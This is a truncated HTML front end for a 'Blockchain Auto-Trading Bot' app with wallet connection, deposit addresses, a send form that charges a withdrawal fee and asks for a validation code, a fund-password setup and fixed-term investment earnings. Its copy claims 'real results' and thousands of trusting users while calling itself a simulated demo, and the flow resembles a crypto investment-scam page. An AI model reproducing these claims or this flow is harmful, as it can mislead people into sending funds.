<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Blockchain Auto-Trading Bot</title>
    <meta name="theme-color" content="#0d0f14" />
    <link rel="manifest" href='data:application/manifest+json,{
    "name":"Blockchain Auto-Trading Bot",
    "short_name":"Bot",
    "start_url":"./",
    "display":"standalone",
    "background_color":"#0d0f14",
    "theme_color":"#0d0f14",
    "icons":[
      {"src":"./app-logo.png","sizes":"512x512","type":"image/png"},
      {"src":"./app-logo.png","sizes":"192x192","type":"image/png"}
    ]
  }' />
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://s3.tradingview.com/tv.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/otplib@12.0.1/otplib.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
    <style>
        :root {
            --bg: #0d0f14;
            --panel: #11141b;
            --panel-2: #0f1218;
            --muted: #a0a7b4;
            --brand: #fcd535; /* Binance Yellow */
            --accent: #22c55e;
            --danger: #ef4444;
        }
        html, body {
            background: var(--bg);
            color: #fff;
            font-family: ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif;
        }
        .glass {
            background: linear-gradient(180deg, rgba(255, 255, 255, .06), rgba(255, 255, 255, .02));
            backdrop-filter: blur(10px);
        }
        .btn {
            @apply px-4 py-3 rounded-xl font-semibold;
            background: #1e293b;
        }
        .btn-primary {
            background: var(--brand);
            color: var(--bg);
        }
        .btn-primary:active {
            transform: translateY(1px);
        }
        .btn-ghost {
            background: transparent;
            border: 1px solid rgba(255, 255, 255, .08);
        }
        .tab-active {
            color: var(--brand);
        }
        .hidden-page {
            display: none;
        }
        .page {
            min-height: calc(100dvh - 64px - 64px);
        }
        .safe-note {
            font-size: .75rem;
            color: var(--muted);
        }
        .qr-placeholder {
            width: 128px;
            height: 128px;
            display: flex;
            align-items: center;
            justify-content: center;
            background-color: #333;
            color: #999;
            border-radius: 8px;
            font-size: 10px;
        }
        .footer-btn {
            @apply flex flex-col items-center justify-center p-2 text-[10px];
        }
        .footer-btn svg {
            @apply w-5 h-5 mb-1;
        }
        .footer-btn.active {
            color: var(--brand);
        }
    </style>
</head>
<body class="min-h-screen flex flex-col">

<div id="modal" class="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50 hidden">
    <div class="bg-[var(--panel)] p-6 rounded-2xl shadow-xl max-w-sm mx-auto">
        <h3 id="modalTitle" class="text-xl font-bold mb-2"></h3>
        <p id="modalMessage" class="text-[var(--muted)] mb-4"></p>
        <button onclick="window.hideModal()" class="w-full btn-primary rounded-xl">OK</button>
    </div>
</div>

<div id="securityModal" class="fixed inset-0 bg-black bg-opacity-70 hidden items-center justify-center z-50 p-4">
  <div class="bg-gray-900 text-gray-100 rounded-xl w-full max-w-lg p-6 relative">
    <button id="closeSecurityModal" class="absolute top-4 right-4 text-gray-400 hover:text-white font-bold text-lg">‚úñ</button>
    <h2 class="text-2xl font-bold mb-4">üîê Security Setup</h2>

    <div class="bg-gray-800 p-4 rounded-lg mb-4">
      <p><strong>User ID:</strong> <span id="modalUserId">USER-123456789</span></p>
      <p><strong>Username:</strong> <input type="text" id="modalUsername" readonly class="bg-gray-700 text-white rounded px-2 py-1 w-full mt-1"></p>
    </div>

    <label class="block font-semibold mb-1">Scan this QR Code in Google Authenticator:</label>
    <div id="modalQrCode" class="mb-2"></div>
    <div id="modalSecretKey" class="bg-gray-800 p-2 rounded mb-4"></div>

    <label class="block font-semibold mb-1">Enter 2FA Code:</label>
    <input type="number" id="modalCodeInput" placeholder="Enter 6-digit code" class="w-full mb-2 px-3 py-2 rounded bg-gray-800 text-white">
    <button id="verify2FABtn" class="w-full bg-blue-600 hover:bg-blue-700 py-2 rounded mb-2">Verify Code</button>
    <div id="verifyResult" class="mb-4"></div>

    <label class="block font-semibold mb-1">Set Fund Password:</label>
    <div class="flex mb-4">
      <input type="password" id="modalFundPassword" placeholder="Enter fund password" class="flex-grow px-3 py-2 rounded-l bg-gray-800 text-white">
      <button id="toggleFundPassword" class="bg-gray-700 px-3 rounded-r">üëÅ</button>
    </div>

    <button id="saveSecurityBtn" class="w-full bg-green-600 hover:bg-green-700 py-2 rounded">Save Security Settings</button>
    <div id="saveResult" class="mt-2"></div>
  </div>
</div>

<header class="h-16 flex items-center justify-between px-4 border-b border-white/5 bg-[var(--panel)]">
    <div class="flex items-center gap-3">
        <img alt="logo" class="w-8 h-8" src="./app-logo.png" />
        <div class="text-sm leading-tight">
            <div class="font-bold">Blockchain Bot</div>
            <div id="netTag" class="text-[11px] text-[var(--muted)]">Disconnected</div>
        </div>
    </div>
    <div class="flex items-center gap-2">
        <button onclick="window.showPage('home')" class="btn-ghost px-3 py-2 rounded-lg text-xs">Portfolio</button>
        <button onclick="window.showPage('settings')" class="btn-ghost px-3 py-2 rounded-lg text-xs">Settings</button>
    </div>
</header>

<main class="flex-1">
    <section id="landing" class="page px-4 py-4 space-y-5">
        <div class="rounded-2xl p-5 glass">
            <img alt="Automated Trading Bots" class="w-full h-auto mb-4 rounded-lg" src="./app-logo.png" />
          <h1 class="text-3xl font-bold mb-2">üöÄ Welcome to the Future of Trading</h1>
         <p class="text-base font-medium text-blue-600 mb-6">‚ú® Powered by Blockchain Technology</p>

        <p class="text-lg text-[var(--muted)]">
           Smarter. Faster. Safer. <br />
            Our <strong>Blockchain Auto-Trading Bot</strong> is built to give you an edge in the fast-moving crypto market. 
             Designed with <strong>advanced algorithms, real-time data analysis, and blockchain-level security</strong>, 
               the bot works for you 24/7 ‚Äî so your money never sleeps.
                </p><div class="mt-4 grid grid-cols-2 gap-2">
                <button id="connectWalletBtn" class="btn-primary rounded-xl">Connect Wallet</button>
                <button id="getAppBtn" class="btn-ghost rounded-xl">GET APP</button>
            </div>
            <p class="safe-note mt-2 text-sm text-green-600 font-medium">
           ‚úÖ Secure & Transparent: Powered by blockchain technology to ensure safety, trust, and real results.
           </p>
        </div>
        <div class="rounded-2xl p-5 bg-[var(--panel)]">
            <div class="flex items-center justify-between mb-3">
                <h2 class="font-semibold">Market Overview</h2>
                <button id="refreshMarket" class="text-xs text-[var(--muted)]">Refresh</button>
            </div>
            <div id="marketList" class="divide-y divide-white/5"></div>
        </div>
        <section id="how-it-works" class="px-4 py-4 space-y-4">
            <h2 class="text-xl font-bold text-center text-[var(--brand)]">How It Works</h2>
            <div class="rounded-2xl p-5 bg-[var(--panel)] space-y-4">
                <div class="flex items-start gap-4">
                    <div class="text-2xl font-bold text-[var(--accent)]">1.</div>
                    <div>
                        <h3 class="text-lg font-semibold">Connect Your Wallet</h3>
                        <p class="text-sm text-[var(--muted)]">Securely link your existing crypto wallet using WalletConnect or a browser extensions.</p>
                    </div>
                </div>
                <div class="flex items-start gap-4">
                    <div class="text-2xl font-bold text-[var(--accent)]">2.</div>
                    <div>
                        <h3 class="text-lg font-semibold">Explore Markets</h3>
                        <p class="text-sm text-[var(--muted)]">Dive into our comprehensive market overview with real-time price updates and interactive charts for your favorite cryptocurrencies.</p>
                    </div>
                </div>
                <div class="flex items-start gap-4">
                    <div class="text-2xl font-bold text-[var(--accent)]">3.</div>
                    <div>
                        <h3 class="text-lg font-semibold">Trade & Manage</h3>
                        <p class="text-sm text-[var(--muted)]">Effortlessly execute simulated buy and sell orders, track your portfolio performance, and view your transaction history all in one place.</p>
                    </div>
                </div>
            </div>
        </section>
        <section id="cta-section" class="px-4 py-4 text-center bg-[var(--panel-2)] rounded-2xl">
            <h2 class="text-xl font-bold text-[var(--brand)] mb-2">Ready to Get Started?</h2>
            <p class="text-sm text-[var(--muted)] mb-4">Join thousands of users who trust this platform for their crypto trading and portfolio management needs.</p>
            <button id="cta-connect-wallet-btn" class="btn-primary rounded-xl">Connect Wallet & Start Trading</button>
        </section>
        <section id="faq" class="px-4 py-4 space-y-4">
            <h2 class="text-xl font-bold text-center text-[var(--brand)]">Frequently Asked Questions</h2>
            <div class="space-y-3">
                <details class="bg-[var(--panel)] p-4 rounded-xl">
                    <summary class="font-semibold text-white cursor-pointer">What is this platform?</summary>
                    <p class="text-sm text-[var(--muted)] mt-2">This is a sophisticated crypto terminal that allows you to track market data, connect your wallet, and simulate crypto trades in real-time. It is a demo for educational purposes.</p>
                </details>
                <details class="bg-[var(--panel)] p-4 rounded-xl">
                    <summary class="font-semibold text-white cursor-pointer">Is my wallet secure?</summary>
                    <p class="text-sm text-[var(--muted)] mt-2">Yes, we use industry-standard secure connection methods like WalletConnect and MetaMask. Your private keys never leave your wallet.</p>
                </details>
                <details class="bg-[var(--panel)] p-4 rounded-xl">
                    <summary class="font-semibold text-white cursor-pointer">Do you support real trading?</summary>
                    <p class="text-sm text-[var(--muted)] mt-2">Currently, this platform provides a simulation environment for trading. It's perfect for practicing strategies without real financial risk. No real orders are placed and no real funds are used.</p>
                </details>
            </div>
        </section>
    </section>

    <section id="loading" class="page px-4 py-8 hidden-page">
        <div class="flex flex-col items-center justify-center gap-4 mt-20">
            <svg class="animate-spin h-10 w-10 text-[var(--brand)]" viewBox="0 0 24 24">
                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"></path>
            </svg>
            <div class="text-sm text-[var(--muted)]">Setting up your session...</div>
        </div>
    </section>

    <section id="home" class="page px-4 py-4 hidden-page space-y-4">
        <div class="rounded-2xl p-5 bg-[var(--panel)]">
            <div class="text-xs text-[var(--muted)]">Total Portfolio</div>
            <div id="totalBalance" class="text-3xl font-bold">$0.00</div>
            <div class="mt-4 flex gap-2">
                <button onclick="window.showPage('deposit'); window.startDepositFlow()" class="btn-primary rounded-xl">Deposit</button>
                <button onclick="window.showModal('Coming Soon', 'Swap is not enabled in this demo.')" class="btn-ghost rounded-xl">Swap</button>
                <button onclick="window.showPage('send')" class="btn-ghost rounded-xl">Send</button>
            </div>
        </div>
        
        <div class="rounded-2xl p-5 bg-[var(--panel)]">
            <div class="text-xs text-[var(--muted)]">Account ID</div>
            <div id="homeAccountId" class="text-sm break-all font-mono"></div>
        </div>

        <div class="rounded-2xl p-5 bg-[var(--panel)]">
            <div class="flex items-center justify-between mb-3">
                <h2 class="font-semibold">Performance (BTCUSD)</h2>
                <span class="text-[var(--muted)] text-xs">TradingView</span>
            </div>
            <div id="tv_chart" style="height:360px;"></div>
        </div>

        <div class="rounded-2xl p-5 bg-[var(--panel)]">
            <div class="flex items-center justify-between mb-3">
                <h2 class="font-semibold">Top Movers (24h)</h2>
                <button id="refreshMovers" class="text-xs text-[var(--muted)]">Refresh</button>
            </div>
            <div id="moversList" class="divide-y divide-white/5"></div>
        </div>
    </section>

    <section id="discover" class="page px-4 py-4 hidden-page space-y-4">
        <div class="rounded-2xl p-5 bg-[var(--panel)]">
            <div class="flex items-center justify-between mb-3">
                <h2 class="font-semibold">Discover</h2>
                <button id="searchOpen" class="btn-ghost rounded-lg text-xs">Search</button>
            </div>
            <div id="discoverFeed" class="space-y-3"></div>
        </div>
    </section>

    <section id="trade" class="page px-4 py-4 hidden-page space-y-4">
        <div class="rounded-2xl p-5 bg-[var(--panel)]">
            <div class="flex items-center justify-between">
                <h2 class="font-semibold">Trade</h2>
                <button onclick="window.showModal('Coming Soon', 'Earnings screen is a UI-only demo.')" class="btn-ghost rounded-lg text-xs">View Earnings</button>
            </div>
            <div id="tradeChart" style="height:360px;"></div>
            <div class="mt-4 grid gap-4">
                <div class="flex flex-col gap-2">
                    <label for="tradeAssetSelect" class="text-sm text-[var(--muted)]">Select Asset:</label>
                    <select id="tradeAssetSelect" class="w-full px-4 py-3 rounded-xl bg-[var(--panel-2)] border border-white/10 focus:outline-none focus:border-[var(--brand)] transition-colors"></select>
                </div>
                <div class="flex flex-col gap-2">
                    <label for="tradeDuration" class="text-sm text-[var(--muted)]">Trade Duration (months):</label>
                    <select id="tradeDuration" class="w-full px-4 py-3 rounded-xl bg-[var(--panel-2)] border border-white/10 focus:outline-none focus:border-[var(--brand)] transition-colors">
                        <option value="1">1 month</option>
                        <option value="2">2 months</option>
                        <option value="3">3 months</option>
                        <option value="4">4 months</option>
                        <option value="5">5 months</option>
                        <option value="6">6 months</option>
                        <option value="7">7 months</option>
                        <option value="8">8 months</option>
                        <option value="9">9 months</option>
                        <option value="10">10 months</option>
                        <option value="11">11 months</option>
                        <option value="12">12 months</option>
                    </select>
                </div>
                <div class="flex flex-col gap-2">
                    <label for="tradeAmount" class="text-sm text-[var(--muted)]">Investment Amount ($):</label>
                    <input type="number" id="tradeAmount" placeholder="Enter investment amount" class="w-full px-4 py-3 rounded-xl bg-[var(--panel-2)] border border-white/10 focus:outline-none focus:border-[var(--brand)] transition-colors">
                </div>
                <button id="startTradeBtn" class="btn-primary rounded-xl">Place Trade</button>
            </div>
            
            <div id="tradeInfo" class="mt-6 rounded-xl p-4 bg-[var(--panel-2)]">
                <div class="flex justify-between items-center text-sm">
                    <span class="text-[var(--muted)]">Trade Account Balance:</span>
                    <span id="tradeBalance" class="font-semibold">$0.00</span>
                </div>
                <div class="flex justify-between items-center text-sm mt-2">
                    <span class="text-[var(--muted)]">Total Earnings:</span>
                    <span id="tradeEarnings" class="font-semibold">$0.00</span>
                </div>
            </div>
            <p class="safe-note mt-4">This is a non-custodial demo UI. No real orders are placed.</p>
        </div>
    </section>

    <section id="memes" class="page px-4 py-4 hidden-page space-y-4">
        <div class="rounded-2xl p-5 bg-[var(--panel)]">
            <h2 class="font-semibold mb-3">Trending (CoinGecko)</h2>
            <div id="memeList" class="space-y-3"></div>
        </div>
    </section>

    <section id="settings" class="page px-4 py-4 hidden-page space-y-4">
        <div class="rounded-2xl p-5 bg-[var(--panel)]">
            <h2 class="font-semibold mb-3">Account Settings</h2>
            
            <div class="text-sm text-[var(--muted)]">Wallet Address</div>
            <div id="accountWalletAddress" class="font-mono text-sm break-all">‚Äî</div>
            
            <div class="mt-2 text-sm text-[var(--muted)]">Wallet Balance</div>
            <div id="accountWalletBalance" class="font-mono text-sm break-all">0 ETH</div>

            <div class="mt-4 text-sm text-[var(--muted)]">Account ID</div>
            <div id="accountId" class="font-mono text-sm break-all">‚Äî</div>

            <div class="mt-4 flex gap-2">
                <button onclick="window.openWalletModal()" class="btn-ghost rounded-xl">Connected Wallet</button>
                <button id="disconnectBtn" class="btn-ghost rounded-xl text-[var(--danger)] border border-[var(--danger)]">Disconnect</button>
                <button id="securityBtn" class="btn-ghost rounded-xl">Security</button>
                <button id="themeToggle" class="btn-ghost rounded-xl">Toggle Theme</button>
            </div>
        </div>
    </section>

    <section id="deposit" class="page px-4 py-4 hidden-page space-y-4">
        <div id="deposit-step-1" class="space-y-4">
            <div class="flex items-center gap-3">
                <button onclick="window.showPage('home')" class="p-2 rounded-full hover:bg-white/5">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                        <path stroke-linecap="round" stroke-linejoin="round" d="M15 19l-7-7 7-7" />
                    </svg>
                </button>
                <h2 class="text-xl font-bold">Deposit</h2>
            </div>
            <input id="coinSearchInput" type="text" placeholder="Search for a coin" class="w-full px-4 py-3 rounded-xl bg-[var(--panel-2)] border border-white/10 focus:outline-none focus:border-[var(--brand)] transition-colors">
            <div id="coinList" class="space-y-2 mt-4 max-h-[60vh] overflow-y-auto">
                <div class="text-sm text-center text-[var(--muted)] py-4">Loading coins...</div>
            </div>
        </div>

        <div id="deposit-step-2" class="hidden space-y-4">
            <div class="flex items-center gap-3">
                <button onclick="window.showDepositStep(1)" class="p-2 rounded-full hover:bg-white/5">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                        <path stroke-linecap="round" stroke-linejoin="round" d="M15 19l-7-7 7-7" />
                    </svg>
                </button>
                <h2 class="text-xl font-bold">Select Network</h2>
            </div>
            <div id="selectedCoinInfo" class="rounded-xl p-4 bg-[var(--panel)] flex items-center gap-4"></div>
            <div class="rounded-xl p-4 bg-[var(--panel)]">
                <div class="font-semibold mb-2">Available Networks</div>
                <div class="space-y-3" id="networkList"></div>
            </div>
        </div>

        <div id="deposit-step-3" class="hidden space-y-4 text-center">
            <div class="flex items-center gap-3">
                <button onclick="window.showDepositStep(2)" class="p-2 rounded-full hover:bg-white/5">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                        <path stroke-linecap="round" stroke-linejoin="round" d="M15 19l-7-7 7-7" />
                    </svg>
                </button>
                <h2 class="text-xl font-bold">Deposit Address</h2>
            </div>
            <div class="bg-[var(--panel)] rounded-xl p-6">
                <div id="qrCodeContainer" class="p-4 bg-white rounded-lg inline-block"></div>
                <div class="text-xs text-[var(--muted)] mt-4">Selected Network</div>
                <div id="selectedNetworkInfo" class="text-sm font-semibold"></div>
                <div id="depositAddressText" class="break-all font-mono text-xs mt-1"></div>
                <p class="safe-note mt-4">Only send <span id="depositCoinSymbol"></span> to this address. Sending other assets may result in permanent loss.</p>
                <button onclick="window.copyAddress()" class="btn-ghost mt-4 w-full">Copy Address</button>
            </div>
        </div>
    </section>
    
    <section id="send" class="page px-4 py-4 hidden-page space-y-4">
        <div class="rounded-2xl p-5 bg-[var(--panel)]">
            <div class="flex items-center justify-between mb-3">
                <h2 class="font-semibold">Send Funds</h2>
                <button onclick="window.showPage('home')" class="text-sm text-[var(--muted)]">Back</button>
            </div>
            
            <div id="sendForm" class="grid gap-4 mt-3">
                <div class="flex flex-col gap-2">
                    <label for="sendAddress" class="text-sm text-[var(--muted)]">Recipient Address:</label>
                    <input type="text" id="sendAddress" placeholder="Enter address" class="w-full px-4 py-3 rounded-xl bg-[var(--panel-2)] border border-white/10 focus:outline-none focus:border-[var(--brand)] transition-colors">
                </div>
                <div class="flex flex-col gap-2">
                    <label for="sendNetwork" class="text-sm text-[var(--muted)]">Select Network:</label>
                    <select id="sendNetwork" class="w-full px-4 py-3 rounded-xl bg-[var(--panel-2)] border border-white/10 focus:outline-none focus:border-[var(--brand)] transition-colors">
                        <option value="BTC">Bitcoin [BTC]</option>
                        <option value="ETH">Ethereum [ERC-20]</option>
                        <option value="BSC">BNB Smart Chain [BEP20]</option>
                        <option value="TRC">Tron [TRC-20]</option>
                    </select>
                </div>
                <div class="flex flex-col gap-2">
                    <label for="sendAmount" class="text-sm text-[var(--muted)]">Amount:</label>
                    <input type="number" id="sendAmount" placeholder="Enter amount" class="w-full px-4 py-3 rounded-xl bg-[var(--panel-2)] border border-white/10 focus:outline-none focus:border-[var(--brand)] transition-colors">
                </div>
                <p class="safe-note mt-1">Withdrawal fee: ~0.19 (BNB/ETH/etc. depending on network)</p>

                <button id="sendConfirmBtn" class="btn-primary rounded-xl">Confirm Send</button>
                <p id="sendStatus" class="text-sm text-center text-[var(--muted)]"></p>
            </div>

            <div id="sendValidationSection" class="hidden grid gap-4 mt-4">
                <div class="flex flex-col gap-2">
                    <label for="validationCode" class="text-sm text-[var(--muted)]">Enter Validation Code:</label>
                    <input type="text" id="validationCode" placeholder="Enter code" class="w-full px-4 py-3 rounded-xl bg-[var(--panel-2)] border border-white/10 focus:outline-none focus:border-[var(--brand)] transition-colors">
                </div>
                <button id="validateCodeBtn" class="btn-primary rounded-xl">Submit Code</button>
                <p id="validationStatus" class="text-sm text-center text-[var(--muted)]"></p>
            </div>
        </div>
    </section>
    
    <section id="transfer" class="page px-4 py-4 hidden-page space-y-4">
        <div class="rounded-2xl p-5 bg-[var(--panel)]">
            <h2 class="font-semibold mb-3">Transfer Funds</h2>
            <div class="grid gap-4 mt-3">
                <div class="flex flex-col gap-2">
                    <label for="transferAmount" class="text-sm text-[var(--muted)]">Amount:</label>
                    <input type="number" id="transferAmount" placeholder="Enter amount" class="w-full px-4 py-3 rounded-xl bg-[var(--panel-2)] border border-white/10 focus:outline-none focus:border-[var(--brand)] transition-colors">
                </div>
                <div class="flex flex-col gap-2">
                    <label for="transferDirection" class="text-sm text-[var(--muted)]">Direction:</label>
                    <select id="transferDirection" class="w-full px-4 py-3 rounded-xl bg-[var(--panel-2)] border border-white/10 focus:outline-none focus:border-[var(--brand)] transition-colors">
                        <option value="toTrade">Transfer to Trade Account</option>
                        <option value="toMain">Transfer to Main Wallet</option>
                    </select>
                </div>
                <button id="transferBtn" class="btn-primary rounded-xl">Transfer</button>
                <p id="transferStatus" class="text-sm text-center text-[var(--muted)]"></p>
                <button onclick="window.showPage('trade')" class="btn-ghost rounded-xl">Back</button>
            </div>
        </div>
    </section>

</main>
<nav class="h-16 border-t border-white/5 bg-[var(--panel)] grid grid-cols-5 text-center text-xs">
    <button data-tab="home" class="footer-btn tab py-3 tab-active" onclick="window.showPage('home')">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
            <path d="M11.996 1.993a1 1 0 0 1 .998.998v3.42a1 1 0 0 1-1.996 0V2.991a1 1 0 0 1 .998-.998zM5.926 4.606a1 1 0 0 1 1.414 0L9.125 6.39a1 1 0 1 1-1.414 1.414L5.926 6.02a1 1 0 0 1 0-1.414zM2.991 11.996a1 1 0 0 1 .998-.998h3.42a1 1 0 0 1 0 1.996h-3.42a1 1 0 0 1-.998-.998zM5.926 19.386a1 1 0 0 1 1.414 0l1.79-1.79a1 1 0 1 1 1.414 1.414l-1.79 1.79a1 1 0 0 1-1.414 0zM11.996 21.002a1 1 0 0 1-.998-.998v-3.42a1 1 0 0 1 1.996 0v3.42a1 1 0 0 1-.998.998zM19.386 18.067a1 1 0 0 1 0-1.414l1.79-1.79a1 1 0 0 1 1.414 1.414l-1.79 1.79a1 1 0 0 1-1.414 0zM21.002 11.996a1 1 0 0 1-.998.998h-3.42a1 1 0 0 1 0-1.996h3.42a1 1 0 0 1 .998.998zM18.067 5.926a1 1 0 0 1-1.414 0l-1.79 1.79a1 1 0 0 1 1.414 1.414l1.79-1.79a1 1 0 0 1 0-1.414z"/>
            <path fill-rule="evenodd" d="M12 18.5a6.5 6.5 0 1 0 0-13 6.5 6.5 0 0 0 0 13zM12 20a8 8 0 1 0 0-16 8 8 0 0 0 0 16z" clip-rule="evenodd"/>
        </svg>
        <span>Home</span>
    </button>
    <button data-tab="discover" class="footer-btn tab py-3" onclick="window.showPage('discover')">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
            <path d="M12 3a9 9 0 0 0-9 9c0 1.76.5 3.4 1.38 4.8.88-1.4 1.38-3.04 1.38-4.8a6.5 6.5 0 1 1 13 0c0 1.76.5 3.4 1.38 4.8.88-1.4 1.38-3.04 1.38-4.8a9 9 0 0 0-9-9z"/>
            <path fill-rule="evenodd" d="M12 18.5a6.5 6.5 0 1 0 0-13 6.5 6.5 0 0 0 0 13zM12 20a8 8 0 1 0 0-16 8 8 0 0 0 0 16z" clip-rule="evenodd"/>
            <path d="M20.69 16.5A9.95 9.95 0 0 1 12 22a9.95 9.95 0 0 1-8.69-5.5.99.99 0 0 1 .38-.28 1 1 0 0 1 1.2.22A9 9 0 0 0 12 20a9 9 0 0 0 7.11-3.56 1 1 0 0 1 1.2-.22.99.99 0 0 1 .38.28z"/>
        </svg>
        <span>Discover</span>
    </button>
    <button data-tab="trade" class="footer-btn tab py-3" onclick="window.showPage('trade')">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
            <path fill-rule="evenodd" d="M4.293 2.293a1 1 0 0 1 1.414 0l6 6a1 1 0 0 1-1.414 1.414l-6-6a1 1 0 0 1 0-1.414zM16 11.5a1 1 0 1 0 0 2h3a1 1 0 1 0 0-2h-3zM14.5 16a1 1 0 1 0-2 0v3a1 1 0 1 0 2 0v-3zM2.5 16a1 1 0 1 0-2 0v3a1 1 0 1 0 2 0v-3z" clip-rule="evenodd"/>
            <path d="M15 15a1 1 0 0 1 1-1h6a1 1 0 1 1 0 2h-6a1 1 0 0 1-1-1zM9 15a1 1 0 0 1 1-1h4a1 1 0 1 1 0 2h-4a1 1 0 0 1-1-1zM11 11a1 1 0 0 1 1-1h6a1 1 0 1 1 0 2h-6a1 1 0 0 1-1-1zM5 11a1 1 0 0 1 1-1h4a1 1 0 1 1 0 2h-4a1 1 0 0 1-1-1zM18 7a1 1 0 0 1 1-1h4a1 1 0 1 1 0 2h-4a1 1 0 0 1-1-1zM12 7a1 1 0 0 1 1-1h4a1 1 0 1 1 0 2h-4a1 1 0 0 1-1-1z"/>
            <path d="M2.293 2.293a1 1 0 0 1 1.414 0l6 6a1 1 0 0 1-1.414 1.414l-6-6a1 1 0 0 1 0-1.414z"/>
        </svg>
        <span>Trade</span>
    </button>
    <button data-tab="memes" class="footer-btn tab py-3" onclick="window.showPage('memes')">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
            <path d="M12 2a10 10 0 1 0 0 20 10 10 0 0 0 0-20zM10.5 8a1.5 1.5 0 1 1-3 0 1.5 1.5 0 0 1 3 0zM16.5 8a1.5 1.5 0 1 1-3 0 1.5 1.5 0 0 1 3 0zM12 17.5a4.5 4.5 0 0 1-4.5-4.5h9a4.5 4.5 0 0 1-4.5 4.5z"/>
        </svg>
        <span>Meme</span>
    </button>
    <button data-tab="settings" class="footer-btn tab py-3" onclick="window.showPage('settings')">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
            <path d="M19.16 1.48L17.75 0 14.33 3.42 15.75 4.84A1 1 0 0 1 15.75 6.25L14.33 7.67A1 1 0 0 1 13 7.67L11.58 6.25A1 1 0 0 1 11.58 4.84L13 3.42 9.58 0 8.17 1.42A1 1 0 0 1 8.17 2.83L9.58 4.25A1 1 0 0 1 9.58 5.67L8.17 7.08A1 1 0 0 1 6.75 7.08L5.33 5.67A1 1 0 0 1 5.33 4.25L6.75 2.83A1 1 0 0 1 6.75 1.42L5.33 0 1.92 3.42 3.33 4.84A1 1 0 0 1 3.33 6.25L1.92 7.67A1 1 0 0 1 1.92 9.08L3.33 10.5A1 1 0 0 1 3.33 11.92L1.92 13.33A1 1 0 0 1 1.92 14.75L3.33 16.17A1 1 0 0 1 3.33 17.58L1.92 19 5.33 22.42 6.75 21A1 1 0 0 1 6.75 19.58L8.17 18.17A1 1 0 0 1 8.17 16.75L9.58 15.33A1 1 0 0 1 9.58 13.92L8.17 12.5A1 1 0 0 1 8.17 11.08L9.58 9.67A1 1 0 0 1 9.58 8.25L8.17 6.83A1 1 0 0 1 6.75 6.83L5.33 8.25A1 1 0 0 1 5.33 9.67L6.75 11.08A1 1 0 0 1 6.75 12.5L5.33 13.92A1 1 0 0 1 5.33 15.33L6.75 16.75A1 1 0 0 1 6.75 18.17L8.17 19.58A1 1 0 0 1 8.17 21L9.58 22.42 13 19 14.42 20.42A1 1 0 0 1 14.42 21.83L13 23.25A1 1 0 0 1 13 24.67L14.42 26.08A1 1 0 0 1 14.42 27.5L13 28.92A1 1 0 0 1 13 30.33L14.42 31.75A1 1 0 0 1 15.83 31.75L17.25 30.33A1 1 0 0 1 17.25 28.92L15.83 27.5A1 1 0 0 1 15.83 26.08L17.25 24.67A1 1 0 0 1 18.67 24.67L20.08 26.08A1 1 0 0 1 20.08 27.5L18.67 28.92A1 1 0 0 1 18.67 30.33L20.08 31.75A1 1 0 0 1 21.5 31.75L22.92 30.33A1 1 0 0 1 22.92 28.92L21.5 27.5A1 1 0 0 1 21.5 26.08L22.92 24.67A1 1 0 0 1 22.92 23.25L21.5 21.83A1 1 0 0 1 21.5 20.42L22.92 19A1 1 0 0 1 22.92 17.58L21.5 16.17A1 1 0 0 1 21.5 14.75L22.92 13.33A1 1 0 0 1 22.92 11.92L21.5 10.5A1 1 0 0 1 21.5 9.08L22.92 7.67A1 1 0 0 1 22.92 6.25L21.5 4.84A1 1 0 0 1 21.5 3.42L22.92 1.92A1 1 0 0 1 22.92 0.5L21.5 0Z"/>
            <path d="M12 12a4 4 0 1 0 0 8 4 4 0 0 0 0-8z"/>
        </svg>
        <span>Settings</span>
    </button>
</nav>

<button id="installBtn" class="fixed bottom-20 right-4 btn-primary rounded-full px-5 py-3 hidden">Install App</button>

<div id="searchSheet" class="fixed inset-0 hidden bg-black/60 z-40 flex items-end">
    <div class="w-full bg-[var(--panel)] rounded-t-2xl p-4">
        <div class="flex items-center justify-between mb-2">
            <div class="font-semibold">Search coins</div>
            <button class="text-sm" onclick="window.toggleSearch(false)">Close</button>
        </div>
        <input id="searchInput" class="w-full px-3 py-3 rounded-lg bg-[var(--panel-2)]" placeholder="Type a symbol or name" />
        <div id="searchResults" class="mt-3 max-h-72 overflow-auto divide-y divide-white/5"></div>
    </div>
</div>

<div id="walletModal" class="fixed inset-0 hidden bg-black/60 z-40 flex items-center justify-center">
    <div class="w-[92%] max-w-md bg-[var(--panel)] rounded-2xl p-5">
        <h3 class="font-semibold mb-2">Connected Wallet</h3>
        <div class="text-xs text-[var(--muted)]">Address</div>
        <div id="walletAddr" class="font-mono break-all">‚Äî</div>
        <div class="mt-2 text-xs text-[var(--muted)]">User ID</div>
        <div id="userIdDisplay" class="font-mono break-all">‚Äî</div>
        <div class="mt-4 flex gap-2">
            <button class="btn-ghost rounded-xl" onclick="window.closeWalletModal()">Close</button>
        </div>
    </div>
</div>

<script>
    if ('serviceWorker' in navigator) {
      window.addEventListener('load', () => {
